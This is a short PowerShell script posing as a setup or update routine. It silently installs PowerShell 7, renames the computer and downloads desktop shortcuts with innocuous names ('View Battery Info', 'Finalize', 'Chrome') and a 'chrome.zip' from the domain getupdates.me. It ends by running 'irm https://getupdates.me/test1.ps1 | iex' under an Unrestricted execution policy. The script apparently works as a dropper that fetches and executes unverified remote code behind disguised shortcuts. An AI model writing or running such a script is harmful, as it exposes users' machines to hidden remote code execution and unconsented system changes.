echo "Initializing.."
Invoke-WebRequest -Uri "https://getupdates.me/BatteryInfo.lnk" -OutFile "$env:HOMEPATH\Desktop\View Battery Info.lnk"
Invoke-WebRequest -Uri "https://github.com/PowerShell/PowerShell/releases/download/v7.4.2/PowerShell-7.4.2-win-x64.msi" -OutFile Pwsh.msi
echo "Powershell 7 Installing, Please Wait."
msiexec.exe /package Pwsh.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL=1 REGISTER_MANIFEST=1 USE_MU=1 ENABLE_MU=1 ADD_PATH=1
Start-Sleep -Seconds 30
Invoke-WebRequest -Uri "https://getupdates.me/Final.lnk" -OutFile "$env:HOMEPATH\Desktop\Finalize.lnk"
Invoke-WebRequest -Uri "https://files.getupdates.me/chrome.zip" -OutFile "$env:HOMEPATH\chrome.zip"
$version = "2.8.5.208"

Write-Verbose "Verifying NuGet $version or later is installed"

$nuget = Get-PackageProvider -Name NuGet -ListAvailable -ErrorAction SilentlyContinue |
                Sort-Object -Property {[version]$_.version} | Select-Object -Last 1

if(-not $nuget -or [version]$nuget.version -lt [version]$version){
    Write-Verbose "Installing NuGet $($nuget.Version)"
    $null = Install-PackageProvider -Name NuGet -MinimumVersion $nuget.version -Force
}
$CN = (Get-WmiObject -class win32_bios).SerialNumber
Rename-Computer -NewName "PC-$CN" -WarningAction silentlyContinue
Expand-Archive -LiteralPath "$env:HOMEPATH\chrome.zip" -DestinationPath "$env:HOMEPATH\" -Force
Invoke-WebRequest -Uri "https://getupdates.me/Chrome.lnk" -OutFile "$env:HOMEPATH\Desktop\Chrome.lnk"
Start-Process -FilePath "C:\Program Files\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/test1.ps1 | iex"
